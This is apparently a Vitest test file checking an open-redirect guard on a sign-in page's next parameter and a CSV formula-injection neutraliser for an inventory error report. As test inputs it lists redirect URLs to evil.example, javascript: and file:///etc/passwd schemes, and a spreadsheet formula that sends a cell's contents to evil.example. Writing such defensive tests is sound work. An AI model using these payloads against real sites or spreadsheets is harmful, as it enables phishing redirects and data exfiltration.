import { describe, expect, it } from 'vitest';
import { safeNextPath } from '@/modules/admin';
import { neutralizeCsvValue, errorReportCsv } from '@/modules/inventory';

/**
 * R9 — the sign-in page's `?next=` must not become a phishing launchpad. The
 * victim genuinely authenticates on the real site first, which is exactly what
 * makes an open redirect there convincing.
 */
describe('safeNextPath (R9)', () => {
  it('keeps a legitimate admin path, with its query string', () => {
    expect(safeNextPath('/admin')).toBe('/admin');
    expect(safeNextPath('/admin/inventory')).toBe('/admin/inventory');
    expect(safeNextPath('/admin/inventory?store=abc')).toBe('/admin/inventory?store=abc');
  });

  it('refuses an absolute URL to another origin', () => {
    for (const attack of [
      'https://evil.example/landing',
      'http://evil.example/admin',
      'https://evil.example/admin/inventory',
    ]) {
      expect(safeNextPath(attack)).toBe('/admin');
    }
  });

  it('refuses protocol-relative and backslash forms', () => {
    for (const attack of [
      '//evil.example/x',
      '//evil.example',
      '/\\evil.example',
      '/\\/evil.example',
    ]) {
      expect(safeNextPath(attack)).toBe('/admin');
    }
  });

  it('refuses non-HTTP schemes', () => {
    for (const attack of ['javascript:alert(1)', 'data:text/html,x', 'file:///etc/passwd']) {
      expect(safeNextPath(attack)).toBe('/admin');
    }
  });

  it('refuses a same-origin path outside /admin', () => {
    expect(safeNextPath('/')).toBe('/admin');
    expect(safeNextPath('/api/health')).toBe('/admin');
    // …and a prefix that merely starts with the letters.
    expect(safeNextPath('/administrator')).toBe('/admin');
  });

  it('normalises traversal rather than trusting the raw string', () => {
    expect(safeNextPath('/admin/../api/health')).toBe('/admin');
    expect(safeNextPath('/admin/./inventory')).toBe('/admin/inventory');
  });

  it('falls back for empty or nonsense input', () => {
    expect(safeNextPath('')).toBe('/admin');
    expect(safeNextPath('admin/inventory')).toBe('/admin');
  });
});

/**
 * N2 — the error report is opened in the spreadsheet the broken file came from,
 * where a leading `=` is executed. Quoting does not help: the CSV parser strips
 * the quotes before the formula engine sees the value.
 */
describe('neutralizeCsvValue (N2)', () => {
  it('neutralises every formula prefix', () => {
    expect(neutralizeCsvValue('=1+1')).toBe("'=1+1");
    expect(neutralizeCsvValue('+1')).toBe("'+1");
    expect(neutralizeCsvValue('-1')).toBe("'-1");
    expect(neutralizeCsvValue('@SUM(A1)')).toBe("'@SUM(A1)");
  });

  it('neutralises the exfiltration shape, not just arithmetic', () => {
    const attack = '=WEBSERVICE("http://evil.example/?d="&A1)';
    expect(neutralizeCsvValue(attack).startsWith("'")).toBe(true);
  });

  it('leaves an ordinary value alone', () => {
    expect(neutralizeCsvValue('ABC-123')).toBe('ABC-123');
    expect(neutralizeCsvValue('No product with that SKU')).toBe('No product with that SKU');
  });

  it('strips control characters', () => {
    expect(neutralizeCsvValue(`AB${String.fromCharCode(0)}C`)).toBe('ABC');
    expect(neutralizeCsvValue(`AB${String.fromCharCode(7)}C`)).toBe('ABC');
  });

  it('is applied by the exported error report', () => {
    const csv = errorReportCsv([{ line: 2, sku: '=1+1', message: 'No product with that SKU' }]);
    expect(csv.split('\n')[0]).toBe('line,sku,error');
    expect(csv).toContain("'=1+1");
    expect(csv).not.toMatch(/,=1\+1/);
  });

  it('still quotes a value containing the delimiter', () => {
    const csv = errorReportCsv([{ line: 3, sku: 'A,B', message: 'Says "no"' }]);
    expect(csv).toContain('"A,B"');
    expect(csv).toContain('"Says ""no"""');
  });
});
